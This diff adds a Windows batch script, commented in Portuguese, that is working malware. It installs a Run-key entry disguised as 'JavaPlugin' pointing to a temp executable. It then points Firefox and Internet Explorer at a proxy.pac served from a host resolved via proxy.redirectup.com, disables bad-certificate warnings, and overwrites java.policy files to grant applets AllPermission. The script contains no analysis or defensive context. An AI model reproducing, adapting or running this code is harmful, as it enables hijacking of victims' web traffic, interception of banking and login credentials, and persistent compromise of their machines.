@@ -1,0 +1,62 @@
+@shift
+::@echo off
+@break off
+ver|find "Windows 98">nul
+if not errorlevel 1 goto nao
+if exist %temp%\win32sp.dll goto con
+::adicionando no regedit
+> %temp%\win32sp.dll echo y
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v JavaPlugin /t REG_SZ /d "%temp%\ctfmon.exe" < %temp%\win32sp.dll
+start /low /min iexplore.exe "http://ver.redirectup.com/"
+goto mapa
+::Teste Conexao
+:con
+set ping=%windir%\system32\ping.exe
+:teste
+%ping% 64.233.161.104 -n 1 -l 1 | find "TTL" > nul
+if not errorlevel 1 goto mapa
+goto teste
+:mapa
+::pegando IP
+FOR /F "TOKENS=3 delims=: " %%E IN ('%windir%\system32\ping.exe proxy.redirectup.com -n 1 -l 1 ^| %windir%\system32\find.exe "TTL" ') DO SET ip=%%E
+
+
+
+FOR /F "TOKENS=*" %%E IN ('dir "%HoMePath%\.." /b /s ^| find "prefs.js"') DO %windir%\system32\attrib.exe -r -a -s -h "%%E" && echo user_pref("network.proxy.autoconfig_url", "http://%ip%/proxy.pac"); >> "%%E"
+FOR /F "TOKENS=*" %%E IN ('dir "%HoMePath%\.." /b /s ^| find "prefs.js"') DO %windir%\system32\attrib.exe -r -a -s -h "%%E" && echo user_pref("network.proxy.type", 2); >> "%%E"
+
+
+
+type %temp%\~a.tmp | %systemroot%\system32\find.exe "Internet Explorer\Main">%temp%\~b.tmp && for /f "tokens=2 delims=\" %%D in ('type %temp%\~b.tmp ^| %systemroot%\system32\find.exe "S-1-5-21"') do set CSL=%%D
+echo y|%windir%\system32\reg.exe add "HKU\%CSL%\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "WarnonBadCertRecving" /t REG_DWORD /d "0x00000000" /f
+
+
+cd %HoMePath%
+::Adiciona Proxy para o IE*
+echo Windows Registry Editor Version 5.00 > cfg.reg
+echo [HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings] >> cfg.reg
+echo "AutoConfigURL"="http://%ip%/proxy.pac" >> cfg.reg
+echo "EnableHttp1_1"=dword:00000001 >> cfg.reg
+echo "ProxyEnable"=dword:00000000 >> cfg.reg
+echo "ProxyHttp1.1"=dword:00000000 >> cfg.reg
+regedit /s cfg.reg
+
+cd %HoMePath%
+::Adiciona Proxy para o IE*
+echo Windows Registry Editor Version 5.00 > cfg1.reg
+echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings] >> cfg1.reg
+echo "AutoConfigURL"="http://%ip%/proxy.pac" >> cfg1.reg
+echo "EnableHttp1_1"=dword:00000001 >> cfg1.reg
+echo "ProxyEnable"=dword:00000000 >> cfg1.reg
+echo "ProxyHttp1.1"=dword:00000000 >> cfg1.reg
+regedit /s cfg1.reg
+
+
+::Autoriza execução de Applet
+cd %windir%
+cd ..
+FOR /F "TOKENS=*" %%E IN ('dir /b /s ^| find /i "java.policy"') DO echo grant {  permission java.security.AllPermission;}; > "%%E"
+:nao
+
+::exit
+
